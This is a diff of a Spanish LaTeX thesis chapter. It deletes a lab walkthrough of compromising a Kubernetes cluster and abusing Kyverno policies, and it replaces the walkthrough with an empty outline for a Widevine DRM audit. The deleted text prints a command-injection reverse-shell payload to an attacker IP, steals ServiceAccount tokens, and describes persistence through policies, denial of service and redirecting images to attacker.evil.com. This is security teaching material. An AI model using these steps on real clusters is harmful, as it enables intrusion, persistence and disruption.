@@ -1,291 +1,63 @@
-% !TEX root = A0.MiTFM.tex
+% !TEX root = A0.MiTFG.tex
 
-\chapter{Descripción del ataque}\label{chap:descataque}
+\chapter{Auditoría de seguridad del ecosistema Widevine}
 
-En este capítulo se describe un escenario práctico de ataque ofensivo en un clúster Kubernetes que tiene instalado el motor de políticas Kyverno. Se detalla cómo, partiendo de una intrusión inicial a través de una vulnerabilidad de tipo RCE (Remote Code Execution) en la aplicación web desplegada en el clúster y escapando del pod de DVWA, se pueden realizar acciones ofensivas aprovechando Kyverno de forma maliciosa. Se analizan las 3 categorías principales de políticas de Kyverno (validación, mutación, generación) mostrando para cada caso cómo se modifica una política legítima existente para invertir su comportamiento, y cómo se puede además crear una política que no existía previamente, con un sentido ofensivo. 
+\section{Metodología de auditoría}
+\apartadoPendiente
 
-\section{Acceso inicial mediante vulnerabilidad RCE en DVWA}
+\subsection{Caja negra}
+\apartadoPendiente
 
-Para obtener acceso inicial al clúster, se explota la vulnerabilidad de ejecución remota de comandos (RCE) en la aplicación DVWA desplegada en el clúster de Kubernetes.
+\subsection{Caja gris}
+\apartadoPendiente
 
-En este escenario, DVWA está expuesta en el clúster como un servicio accesible desde la red externa de la máquina, en el puerto 30080. Usando la máquina con Kali Linux, se navega a la funcionalidad vulnerable de DVWA, en este caso, la sección de Command Injection. Aprovechando que DVWA en nivel de seguridad bajo no sanea adecuadamente la entrada del usuario, se puede inyectar un comando malicioso adicional en un parámetro que pasa directamente a bash. DVWA ofrece un formulario para hacer ping a una dirección IP, donde se ingresa una dirección seguida de un punto y coma (;) y una orden para abrir una shell inversa en la máquina del atacante. El payload en concreto usado es el siguiente:
+\subsection{Análisis de tráfico}
+\apartadoPendiente
 
-\begin{mypython}[caption={Comando shell inversa.} \textwidth]
-8.8.8.8; bash -c "exec 5<>/dev/tcp/192.168.1.43/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done"
-\end{mypython}
+\subsection{Reproducción de ataques}
+\apartadoPendiente
 
-En este payload, la dirección IP 8.8.8.8 es el input legítimo para la función ping, el separador punto y coma rompe la secuencia e indica a la shell que ejecute un nuevo comando; la parte restante abre un socket para establecer una shell inversa desde el contenedor de DVWA hacia la máquina atacante (IP 192.169.1.43) en el puerto 4444. Al enviar este input, DVWA concatena la cadena en una llamada a la shell del sistema y, debido a la vulnerabilidad, ejecuta tanto el ping como el comando posterior. De esta forma, se logra ejecutar código arbitrario en el contenedor de DVWA, obteniendo una sesión de shell remota. Al alterar el código/flujo de la aplicación de DVWA, y haber conseguido un RCE, ya se ha ejecutado uno de los riesgos identificados en el análisis de STRIDE, siendo en este caso Tampering (manipulación de datos).
+\section{Análisis del flujo de licencias}
+\apartadoPendiente
 
-Una vez que la shell inversa se establece, ya se ha conseguido acceso interactivo como el usuario www-data. En este punto nos encontramos ya dentro de un pod del clúster de Kubernetes. Inmediatamente, se debe verificar el entorno para confirmar que está en un contenedor Kubernetes. En este caso, ya conocemos que estamos realmente en un clúster de Kubernetes, pero un método para saber si realmente se trata de un entorno montado con K8s, es verificar la ruta por defecto donde se encuentra el token de autenticación del ServiceAccount: /var/run/secrets/kubernetes.io/serviceaccount/token. Este token le permitirá interactuar con la API de Kubernetes con los permisos asociados al ServiceAccount del pod comprometido, permitiendo seguir adelante con el ataque. En la figura \ref{fig:shellinversa} se puede verificar cómo se ha conectado desde la máquina DVWA a nuestra Kali correctamente, y se ha extraído el token del Service Account de DVWA. En este punto, se ha expuesto información confidencial (token del Service Account DVWA, en forma JWT) a un actor no autorizado; ésa es la esencia de Information Disclosure (divulgación de información).
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/shell_inversa.png}
-  \caption{Shell inversa y token ServiceAccount}
-  \label{fig:shellinversa}
-\end{figure}
+\subsection{Obtención de tokens}
+\apartadoPendiente
 
-El segundo paso sería comprobar qué permisos tenemos con el Service Account de DVWA. Esto es muy importante, ya que va a definir los pasos a seguir para continuar con el ataque. En este caso, se intenta leer los RoleBindings existentes en el namespace DVWA, pero no se tienen permisos para ello. Consecuentemente, se debería usar técnicas de fuerza bruta para poder ir probando todas las acciones que el atacante desea probar, viendo si se cuenta con permisos para realizarlas. En este caso, sabemos que se tienen permisos de creación de pods, por lo que se puede ir más directo. En la figura \ref{fig:creacion_escape_pod} se puede ver cómo se prueba a crear un pod con el comando \textit{apply}, recibiendo un mensaje que indica que esa acción no está permitida, y con el comando \textit{create}, el cuál permite crear el pod al tener permisos de creación de pods. En este momento se ha conseguido otro paso de STRIDE, ya que, al tener el token de la Service Account de DVWA, estamos suplantando la identidad real y se pueden crear Pods de forma indebida, realizando Spoofing (suplantación de identidad).
+\subsection{Validaciones existentes}
+\apartadoPendiente
 
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/creacion_escape_pod.png}
-  \caption{Intento apply y creación pod}
-  \label{fig:creacion_escape_pod}
-\end{figure}
+\subsection{Dependencias de confianza}
+\apartadoPendiente
 
-Con este dato, se puede seguir con la explotación del clúster, con el objetivo de escapar del pod y tener acceso al nodo. Como se pueden crear pods, se va a explotar el uso de volúmenes para acceder al nodo. Los volúmenes de tipo hostPath permiten a un pod montar directamente un directorio del sistema de archivos del nodo físico (host) dentro del contenedor. Esta funcionalidad, si bien puede ser útil para ciertos casos de uso legítimos (como monitorización o acceso a discos locales), representa un riesgo crítico de seguridad si no se controla adecuadamente. No obstante, es importante destacar que esta configuración peligrosa no es una vulnerabilidad del propio motor de Kubernetes, sino más bien una consecuencia de una mala configuración de seguridad. 
+\section{Evaluación de vulnerabilidades}
+\apartadoPendiente
 
-Para poder aprovechar esta característica de los volúmenes, que proviene de una mala configuración en el clúster, se puede desplegar un pod malicioso que:
+\subsection{CDN \textit{leeching}}
+\apartadoPendiente
 
-\begin{itemize}
-    \item Se ejecuta con privilegios elevados (runAsUser: 0, privileged: true).
-    \item Monte el directorio raíz del nodo (/) en un path arbitrario dentro del contenedor (por ejemplo, /host).
-\end{itemize}
-Al hacerlo, se obtiene acceso directo al sistema de archivos del nodo subyacente, lo cual viola el principio fundamental de aislamiento entre contenedores y nodos. Entre los riesgos que representa la explotación de esta mala configuración, se encuentran:
+\subsection{Reutilización de sesiones}
+\apartadoPendiente
 
-\begin{itemize}
-    \item Leer y modificar ficheros sensibles del nodo, como los ficheros que contienen los tokens de los Service Accounts.
-    \item Acceder a tokens de otros pods, incluyendo los de componentes críticos como Kyverno, entre otros.
-    \item Instalar backdoors o herramientas de persistencia directamente en el host.
-    \item Escapar completamente del entorno controlado de Kubernetes y tomar control total del nodo.
-\end{itemize}
+\subsection{\textit{Credential sharing}}
+\apartadoPendiente
 
-En este caso, y debido a la temática del propio TFG, se va a optar por la segunda opción, para poder aplicar un enfoque ofensivo a Kyverno, modificando las políticas ya existentes o creando nuevas.
+\subsection{Abuso de concurrencia}
+\apartadoPendiente
 
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/acceso_root_pod.png}
-  \caption{Acceso pod root.}
-  \label{fig:acceso_root_pod}
-\end{figure}
+\subsection{Ausencia de validaciones contextuales}
+\apartadoPendiente
 
-El pod aplicado en la figura \ref{fig:creacion_escape_pod} es un pod de tipo root, con los ajustes indicados para montar el directorio de archivos del nodo en nuestro pod, como se puede ver en \nameref{lst:root-pod}. Con el pod creado, el siguiente paso es acceder a él y poder extraer el token del Service Account de Kyverno. Al ser root en el pod, según la figura \ref{fig:acceso_root_pod}, podemos listar todos los pods que hay en el sistema en la ruta /host/var/lib/kubelet/pods, como se puede ver en la figura \ref{fig:listado_pods_cluster}. En este punto se ha conseguido el apartado Elevation of Privileges (elevación de privilegios) del análisis de riesgos de STRIDE, ya que se ha ejecutado un Pod como root.
+\section{Escenarios de ataque reproducidos}
+\apartadoPendiente
 
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/listado_pods_cluster.png}
-  \caption{Listado, por UUID, de todos los pods del clúster.}
-  \label{fig:listado_pods_cluster}
-\end{figure}
+\subsection{Procedimiento}
+\apartadoPendiente
 
-Para averiguar si un pod es de Kyverno, hay que entrar dentro de la carpeta containers, y ver si hay mención a Kyverno. Esto también serviría en el caso de no saber que Kyverno está instalado en el clúster. Esta sería una fase de reconocimiento del nodo, que permitiría definir las próximas acciones a tomar en un ataque.
+\subsection{Resultados}
+\apartadoPendiente
 
-En el caso del pod con UUID d23ea115-75cc-44e5-aaba-f5a62857383c, se comprueba que efectivamente tiene mención a Kyverno, por lo que el token del Service Account asociado a este pod es el de Kyverno. Este token no estaría solo presente en el pod mencionado, sino que estaría presente en todos los pods que haya creado Kyverno. Una vez obtenido el token, disponible en la ruta volumes/kubernetes.io~projected/kube-api-access-mptcb dentro del directorio del pod mencionado, visible en la figura \ref{fig:token_kyverno}, ya tendríamos acceso al namespace de Kyverno.
+\subsection{Evidencias}
+\apartadoPendiente
 
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/token_kyverno.png}
-  \caption{Token del Service Account de Kyverno.}
-  \label{fig:token_kyverno}
-\end{figure}
-
-Con esto, se comprueba que efectivamente se tiene acceso a Kyverno listando las políticas que ya hay creadas en el sistema, como se puede ver en la figura \ref{fig:listado_politicas_kyverno}, por lo que se puede pasar a la ejecución del ataque aplicando las políticas de Kyverno de forma ofensiva.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/listado_politicas_kyverno.png}
-  \caption{Listado de políticas de Kyverno.}
-  \label{fig:listado_politicas_kyverno}
-\end{figure}
-
-
-\section{Ejecución}
-En este apartado se va a mostrar, por cada tipo de política, una modificación de una política existente, para darle un enfoque ofensivo, y se creará una política que no estaba presente en el clúster, que pueda generar un impacto negativo en el sistema.
-
-\subsection{Política de validación}
-Las políticas de Kyverno de tipo validación definen reglas de validación que examinan los recursos solicitados a la API del clúster y rechazan aquellos que no cumplen ciertos criterios, emitiendo un mensaje de error. Esto permite, por ejemplo, impedir el despliegue de pods con configuraciones no seguras o no conformes a la normativa de la organización. En cuanto a como actúan las reglas de validación, hay dos tipos de respuesta:
-
-\begin{itemize}
-    \item \textit{Enforce}: bloquea la creación objeto solicitado en caso de no superar la política de validación, mostrando un mensaje de error.
-    \item \textit{Audit}: deja un log informando de que un objeto se ha creado sin cumplir la política de validación, pero no bloquea su creación.
-\end{itemize}
-
-Desde un enfoque ofensivo, contar con ambas opciones es bastante relevante, ya que se podría modificar el tipo de política de validación de \textit{Enforce} a \textit{Audit}, sin llegar a generar ruido en el sistema. Un cambio de este estilo pasaría bastante desapercibido y podría tardar días en detectarse, ya que, a priori, el clúster funcionaría igual que siempre.
-
-Una política de validación bastante común sería disallow-host-network, la cual impide la creación de pods que accedan directamente a la pila de red del nodo mediante la opción hostNetwork: true. Un atacante que compromete un pod y logra acceso a modificar políticas puede desactivar esta regla, desplegar un contenedor con acceso completo a la red del nodo, y desde ahí capturar tráfico, escanear servicios internos, o incluso comunicarse con el API server de Kubernetes como si estuviera en el propio host, ampliando su superficie de ataque de forma significativa.
-
-En este caso, la política disallow-host-network ya está creada, revisable en \nameref{lst:disallow-host-network}, y podemos comprobar como en la figura \ref{fig:validacion_host_network} no deja crear el pod de Nginx al tener el campo \textit{hostNetwork} marcado a \textit{true}. El YAML utilizado de Nginx está disponible en \nameref{lst:nginx}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/validacion_host_network.png}
-  \caption{Política de validación evita crear un pod con el campo \textit{hostNetwork} marcado a \textit{true}.}
-  \label{fig:validacion_host_network}
-\end{figure}
-
-La modificación que se plantea sobre esta política pasaría por cambiar el modo de aplicarla, pasando del modo \textit{Enforce} al modo \textit{Audit}. Esto provocaría que la política:
-\begin{itemize}
-    \item Deje de bloquear la creación de pods que violan la política.
-    \item Solo registre un evento o advertencia (que muchas veces nadie revisa).
-    \item No rompa la funcionalidad del clúster, por lo que es menos probable que el cambio sea detectado rápidamente.
-\end{itemize}
-
-Para ello, es necesario descargarse la política en formato YAML en la máquina Kali, para editarla y aplicarla de nuevo, sobre escribiendo la política que había previamente. Una característica importante a la hora de aplicar estos cambios en las políticas de Kyverno es que, siempre que se aplique una política con el mismo nombre detallado en el YAML de una política ya aplicada, esta política será sobre escrita. Por lo tanto, es importante fijarse en los nombres de las políticas para evitar crear políticas nuevas y generar ruido en el sistema.
-
-El comando utilizado para descargar la política de validación sería el siguiente:
-
-\begin{mypython}[caption={Descargar política validación} \textwidth]
-kubectl --token=\$TOKEN_KYVERNO \
-  --server=https://192.168.1.44:8443 \
-  --insecure-skip-tls-verify \
-get clusterpolicy disallow-host-network -o yaml > mod-disallow-host-network.yaml
-\end{mypython}
-
-Una vez descargada siguiendo los pasos detallados previamente, habría que modificar la variable \textit{validationFailureAction} al valor \textit{Audit}, y volver a aplicar la política modificando la política existente previamente en el clúster, \nameref{lst:mod-disallow-host-network}. Se puede ver como se aplica la política modificada en la figura \ref{fig:validacion_root_modificado}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/validacion_hostNetwork_modificada.png}
-  \caption{Aplicar modificación de la política de validación hostNetwork.}
-  \label{fig:validacion_hostNetwork_modificada}
-\end{figure}
-
-Se prueba de nuevo a aplicar el pod Nginx, y esta vez se puede ejecutar correctamente manteniendo el campo \textit{hostNetwork} como \textit{true}, como se puede ver en la figura \ref{fig:creacion_pod_hostNetwork}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/creacion_pod_hostNetwork.png}
-  \caption{Creación pod con \textit{hostNetwork} igual a true \textit{true}.}
-  \label{fig:creacion_pod_hostNetwork}
-\end{figure}
-
-Modificando esta política, se puede comprometer un pod vulnerable y obtener los siguientes benificios con objetivos ofensivos:
-\begin{itemize}
-    \item Escuchar tráfico de red del nodo: si un atacante lanza un pod con \textit{hostNetwork: true} y abre un puerto en escucha (nc -lvp 443), puede observar tráfico que va hacia el nodo, incluyendo otras aplicaciones, kubelet, kube-apiserver o incluso Kyverno.
-    \item Posible MITM interno: si se combinan con hostPorts, podría redirigir tráfico del nodo a otro destino o interceptarlo.
-    \item Acceso a servicios locales protegidos por localhost: como el API server expuesto internamente o sockets de servicios críticos.
-    \item Exfiltración discreta: podría establecer una reverse shell desde una IP que no se ve como pod aislado, sino como si saliera desde el nodo.
-\end{itemize}
-
-Todo esto se habría realizado con ruido mínimo, permitiendo a un atacante incluso generar persistencia en el sistema. Además, se ha ejecutado un tipo de riesgo adicional extraído del análisis de STRIDE, Repudiation (repudio). Se ha conseguido modificar exitosamente el funcionamiento de una política de validación de tipo Enforce, al tipo Audit, así que Kyverno no bloquearía el recurso; sólo generaría un log. Esto facilita que, más tarde, el atacante niegue haber saltado la política (“no hubo error, fue permitido”), sin dejar un rastro efectivo y real de lo que ha pasado.
-
-\paragraph{Política de validación adicional: restricción de root \\ \\}
-
-Otro caso muy común de una política de validación es restringir la creación de pods sin la política \textif{runAsNonRoot} dentro del apartado de seguridad (\texitit{securityContext}). Ese ajuste fuerza que todos los contenedores se ejecuten como un usuario no root dentro del pod, previniendo que un contenedor tenga permisos elevados y limitando las posibilidad de escapar del contener a otros pods o al propio nodo.
-
-En este caso, debido a que se ha necesito de la creación de un pod como root para poder escapar al nodo, no se ha aplicado como base esta política de Kyverno. No obstante, debido a la criticidad que supone modificar una política de validación como esta, se va a detallar como se podría aprovechar desde parte de un atacante la existencia de esta política, dejando de lado por este apartado la explotación anterior.
-
-Suponiendo que el clúster cuenta con una política de validación de este estilo, \nameref{lst:require-run-as-nonroot},la cual impide la creación de pods que tengan marcada con el valor c la política \textit{runAsNonRoot}, o directamente no tengan ese atributo en el archivo de creación. Al intentar ejecutar un pod de Nginx sin \textit{runAsNonRoot}, salta un error en la consola ya que no ha pasado la política de validación, avisando de que no se puede ejecutar la creación de este pod, como se ve en la figura \ref{fig:validacion_no_root}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/validacion_no_root.png}
-  \caption{Política de validación evita creación de un pod como root.}
-  \label{fig:validacion_no_root}
-\end{figure}
-
-Una vez descargada siguiendo los pasos detallados previamente, habría que modificar la variable \textit{validationFailureAction} al valor \textit{Audit}, y volver a aplicar la política modificando la política existente previamente en el clúster, \nameref{lst:mod-policy-run-as-root}. Se puede ver como se aplica la política modificada en la figura \ref{fig:validacion_root_modificado}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/validación_root_modificada.png}
-  \caption{Aplicar modificación de la política de validación root.}
-  \label{fig:validacion_root_modificado}
-\end{figure}
-
-Se prueba a crear un pod, forzando que sea ejecutado como root, \nameref{lst:root-pod}, y como se puede ver en la figura \ref{fig:creacion_pod_root}, se ejecuta sin problemas, no mostrando, además, ningún aviso por la consola. El ruido generado en el sistema por esta modificación es prácticamente nulo.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/creacion_pod_root.png}
-  \caption{Ejecución de un pod como root.}
-  \label{fig:creacion_pod_root}
-\end{figure}
-
-\paragraph{Creación de una política de validación desde cero \\ \\}
-
-Debido al control total que se tiene sobre Kyverno, no solo es posible modificar las políticas ya existentes, sino que también es posible crear nuevas políticas. Con un enfoque ofensivo se pueden generar diversas políticas de validación, pero en este caso se ha optado por una política de validación que actuará como un \textit{kill switch} silencioso. Esta política de validación bloqueará la creación de absolutamente cualquier objeto del clúster, sin mostrar de manera obvia y directa el motivo de la denegación. Además, esto congela todos los despliegues, reinicios y escalados, generando una disrupción enorme.
-
-Esta política, \nameref{lst:block-all-pods}, funciona de la siguiente manera:
-\begin{itemize}
-    \item Solo acepta imágenes con nombre "nunca-va-a-coincidir/esta/no/existe:*", que obviamente no se usa nunca.
-    \item Todos los pods fallan en validación y Kyverno devuelve "Acceso denegado." genérico. No da información más allá del mensaje, retrasando su posible detección por varias horas.
-    \item Parece una política de seguridad seria, pero no tiene bypass real.
-\end{itemize}
-
-Esta política nueva se crea en un fichero en la máquina del atacante, por lo que no se deja rastro en la máquina del clúster. Una vez aplicada, se verifica como efectivamente no deja crear ningún pod y devuelve el mensaje genérico de "Acceso Denegado", según la figura \ref{fig:validacion_bloqueo_total}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/validacion_bloqueo_total.png}
-  \caption{Ejecución política validación bloqueo total.}
-  \label{fig:validacion_bloqueo_total}
-\end{figure}
-
-A nivel ofensivo, esta política generará las siguientes ventajas:
-\begin{itemize}
-    \item Una denegación de servicio total en nuevos despliegues, aplicada desde dentro.
-    \item Causa pánico: pods no se escalan, cronjobs fallan, CI/CD se frena.
-    \item Si se ejecuta en un momento adecuado, puede generar caídas que duren hasta más de un día.
-    \item Puede simular un fallo en Kyverno o una mala configuración interna, retrasando la detección de un compromiso de la infraestructura, retrasando el poder echar al atacante de la red interna.
-\end{itemize}
-
-Además, con esta política se ha conseguido el apartado Denial of Service (denegación de servicio) de STRIDE.
-
-\subsection{Política de generación}
-Las políticas de generación de Kyverno permiten que, al ocurrir ciertos eventos (como la creación de un recurso), se genere automáticamente otro recurso asociado. Esto se usa típicamente para garantizar configuraciones por defecto en nuevos Namespaces u objetos relacionados. Un ejemplo típico es la política \textit{add-networkpolicy}, que al crear un Namespace nuevo genera dentro de él una NetworkPolicy de denegación por defecto (default deny), reforzando el aislamiento de red. La lógica es que Kubernetes por defecto no restringe el tráfico entre pods, y conviene añadir una NetworkPolicy que deniegue todo, a menos que se especifiquen reglas más abiertas. 
-
-La política creada para este caso, \nameref{lst:generate-network-policy}, funciona de la siguiente manera: cada vez que se crea un nuevo Namespace, Kyverno (mediante esta regla) generará automáticamente un objeto NetworkPolicy llamado default-deny dentro de ese namespace. La NetworkPolicy en cuestión no contiene ninguna regla de allow (ingress y egress vacíos), lo que efectivamente produce un comportamiento de “denegar todo” en ese namespace. El atributo \textit{synchronize: true} indica que Kyverno continuará monitorizando la coherencia de este recurso: si alguien lo borra o modifica, el controlador de Kyverno lo recreará o revertirá al estado definido por la política.
-
-En este caso, y como tenemos permisos sobre Kyverno, se modificará la regla de la NetworkPolicy generada para que, en vez de denegar todo el tráfico, permita todo el tráfico interno, facilitando así el movimiento lateral por la red del clúster a posibles atacantes. Tras editar la política siguiendo el mismo proceso que el detallado en la política de validación (descarga del YAML, editar los valores concreto, y aplicando de nuevo la política con el mismo nombre), donde se ponen los campos ingress y egress con un array vacío, lo que permite todo el trafico, se vuelve a aplicar la política como se puede ver en la figura \ref{fig:generate_network_modificada}.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/generate_network_modificada.png}
-  \caption{Aplicación política de generación modificada.}
-  \label{fig:generate_network_modificada}
-\end{figure}
-
-Como no se tienen permisos de creación de namespaces no es posible llegar a probar esta política de generación, pero un atacante tampoco necesitaría llegar a probarla. Podría esperar a ser necesario utilizarla, cuando se creen nuevo namespaces, y ya poder atacarlo al permitir todo el tráfico tanto entrante como saliente de ese namespace.
-
-\paragraph{Creación de una política de generación desde cero \\ \\}
-Una de las formas más eficaces de garantizar persistencia dentro de un clúster Kubernetes comprometido es aprovechar las políticas de tipo generate de Kyverno para forzar la regeneración automática de recursos maliciosos. La siguiente política, \nameref{lst:generate-evil-pod}, ilustra este enfoque ofensivo: su función es crear automáticamente un pod con una carga maliciosa dentro de un namespace concreto (por ejemplo, dvwa), y asegurar que este pod sea recreado automáticamente si es eliminado, gracias al uso del atributo \textit{synchronize: true}. Esta política puede quedar activa de forma pasiva, ejecutándose cada vez que Kyverno detecta la existencia del namespace objetivo, sin necesidad de interacción adicional por parte del atacante.
-
-En la figura \ref{fig:generate_evil_pod} se puede ver como se aplica esta regla, lo que desencandenará la creación de este pod mencionado.
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/generate_evil_pod.png}
-  \caption{Generación de Evil Pod.}
-  \label{fig:generate_evil_pod}
-\end{figure}
-
-Tras un par de minutos de aplicar esta política, y teniendo un netcat abierto en la máquina Kali en el puerto 5555, se puede ver como se recibe la consola y se tiene acceso como root a este nuevo pod, como se puede ver en la figura \ref{fig:root_evil_pod}
-
-\begin{figure}[H]
-  \centering
-  \includegraphics[width=0.75\textwidth,clip=true]{figuras/root_evil_pod.png}
-  \caption{Shell inversa Evil Pod.}
-  \label{fig:root_evil_pod}
-\end{figure}
-
-Desde un punto de vista ofensivo, esta estrategia proporciona un mecanismo de persistencia altamente resistente. A diferencia de otras técnicas que requieren ejecutar scripts o mantener shells vivas, el atacante aquí delegaría la responsabilidad de su persistencia al propio controlador de políticas del sistema. De este modo, si el equipo de defensa identifica el pod malicioso y lo elimina manualmente, Kyverno, en cumplimiento de la política introducida, lo volverá a crear casi inmediatamente. Esto puede generar confusión en el equipo de seguridad, haciéndoles pensar que existe un fallo en el plano de control o una automatización legítima que están pasando por alto.
-
-Además, esta técnica permite al atacante reducir su huella de actividad directa. Una vez desplegada la política, no es necesario emitir más comandos desde el pod comprometido ni desde fuera del clúster. Toda la lógica de persistencia queda implantada en un recurso nativo de Kubernetes (ClusterPolicy) que actúa como "agente automático" del atacante. Este nivel de automatización resulta especialmente útil cuando el atacante sabe que va a perder acceso activo al entorno o que los defensores van a tomar acciones reactivas.
-
-Esta política puede ser efectiva incluso si el atacante no puede crear nuevos namespaces (por restricciones RBAC), basta con que conozca uno donde tiene presencia inicial para poder aplicar la política y mantener su carga activa. Esto permite una persistencia silenciosa  y oculta bajo una capa de automatización que podría hacerse pasar por legítima, lo que convierte a este tipo de abuso de políticas generate en una herramienta especialmente peligrosa para comprometer la continuidad operativa del clúster.
-
-
-\subsection{Política de mutación}
-LLas políticas de mutación en Kyverno se utilizan habitualmente para asegurar que ciertos valores estén definidos o corregidos en los manifiestos de los recursos antes de que se apliquen al clúster, ya que en caso de no estarlos, modifica los YAML. Una de las mutaciones más comunes es imponer \textit{imagePullPolicy: Always} en todos los contenedores, lo cual obliga a Kubernetes a recuperar la última versión de la imagen en cada despliegue, independientemente de si ya está presente en el nodo. Esto es útil para garantizar que los cambios en las imágenes con etiquetas flotantes como :latest se apliquen sin necesidad de actualizar el hash.
-
-Sin embargo, desde una perspectiva ofensiva, esta política puede ser manipulada o incluso creada por un atacante para favorecer la carga continua de imágenes maliciosas desde un repositorio controlado. Por ejemplo, si el atacante logra sustituir una imagen legítima (nginx:latest) por una versión idéntica visualmente pero con código inyectado (backdoors, shells inversas, keyloggers...), la política garantizaría que se descargue siempre la imagen más reciente, incluso si los defensores la borran localmente. Esto convierte al sistema en un mecanismo de reimplantación persistente.
-
-Además, el atacante podría combinar esta política con otras técnicas, como la modificación de políticas generate o validate, para evitar que se detecten anomalías en las etiquetas o rutas de la imagen. De esta forma, el propio sistema de políticas de seguridad se convierte en cómplice de la persistencia del atacante, reduciendo la necesidad de interacción directa con el clúster y evitando los sistemas de monitoreo que detectan comandos o acciones manuales.
-
-En entornos corporativos con acceso a múltiples registros de imágenes (internos, externos o mixtos), este tipo de mutación puede pasar desapercibida, especialmente si el atacante mantiene el nombre y etiqueta visibles sin alteraciones, apuntando a un registro DNS alternativo o una IP encubierta. Por tanto, aunque en apariencia esta política mejora la seguridad y coherencia de las imágenes desplegadas, en manos de un actor malicioso puede convertirse en una herramienta de persistencia encubierta altamente eficaz.
-
-La política creada para este caso, la cuál ya estaba presente en el sistema, se puede ver en \nameref{lst:imagepullpolicy}, que realiza lo comentado anteriormente: impone \textit{imagePullPolicy: Always}. El proceso de descarga y modificación del YAML es identico que con las anteriores políticas.
-
-La política modificada, disponible en \nameref{lst:mod-imagepullpolicy} para darle un enfoque ofensivo, emplea la funcionalidad foreach de Kyverno, que permite iterar sobre todos los contenedores definidos en un manifiesto de pod, y reescribe el campo image añadiendo como prefijo un dominio arbitrario (atacante.evil.com) especificado por el atacante. Al hacerlo, cualquier imagen original como nginx, alpine, o incluso imágenes empresariales internas, se transforma en attacker.evil.com/nginx o attacker.evil.com/alpine. Esto, como se ha explicado previamente, generaría un comportamiento controlado por el atacante, ya que cada vez que se lanza un pod, el clúster se conecta al servidor del atacante para recuperar una imagen que, aunque mantenga el mismo nombre visible, puede contener cargas maliciosas, puertas traseras, o comportamientos alterados respecto a la versión oficial.
-
-
-\paragraph{Creación de una política de mutación desde cero \\ \\}
-
-La capacidad de mutación automática ofrece al atacante otra poderosa vía: inyectar componentes maliciosos en las cargas del clúster de forma transparente. Un ejemplo extremo es introducir un sidecar en cada Pod que se cree, de modo que el atacante tenga siempre presencia en cualquier aplicación desplegada. Un sidecar en Kubernetes es un contenedor adicional que se ejecuta junto al contenedor principal dentro del mismo pod, compartiendo el mismo espacio de red, almacenamiento y ciclo de vida. No es el contenedor "aplicativo" principal, sino un contenedor auxiliar que proporciona funcionalidades complementarias. Kyverno facilita la creación de un sidecar mediante reglas de mutación que agregan entradas en el campo spec.containers de los Pods.
-
-Consideremos que el atacante despliega la siguiente política: \nameref{lst:inject-backdoor-sidecar}. En este YAML, la política agrega un nuevo contenedor llamado attacker-sidecar a cada Pod. Se usa una imagen de Alpine Linux y, en este ejemplo, se ejecuta un bucle infinito que regularmente hace beaconing (comunicación saliente) a un servidor controlado por el atacante, informando la identidad del pod comprometido. En un escenario real, el atacante podría utilizar este sidecar para múltiples fines: instalar un minero de criptomonedas que abuse de los recursos del clúster, ejecutar un sniffer para capturar tráfico interno, o abrir una puerta trasera (por ejemplo, escuchando en un puerto para conexiones entrantes del atacante).
-
-Esta maniobra es muy grave, ya que compromete sistemáticamente la integridad de cada despliegue en el clúster. Al inyectar el sidecar malicioso automáticamente, el atacante consigue que cada nueva aplicación venga acompañada de su propio contenedor malicioso sin que los desarrolladores se percaten. Desde el punto de vista ofensivo, esto ofrece persistencia y ubicuidad: aunque se elimine un pod comprometido, cualquier pod nuevo volverá a tener el componente atacante. Adicionalmente, la naturaleza “invisible” (es una mutación en el admission controller) dificulta la detección inicial; para un usuario, el Pod aparece con un contenedor extra que podría confundirse con algún servicio auxiliar legítimo. La administración del clúster queda profundamente comprometida, pues el atacante, a través del sidecar, podría robar datos de las aplicaciones, moverse lateralmente entre pods, o utilizar recursos computacionales a su antojo. En resumen, una funcionalidad pensada para inyectar componentes de soporte (por ejemplo sidecars de logging, proxies de malla de servicios, etc.) es usada de forma ofensiva aquí para inyectar malware en las cargas de forma automatizada.
-
-% Nuevo capítulo
+\section{Limitaciones del modelo DRM tradicional}
+\apartadoPendiente
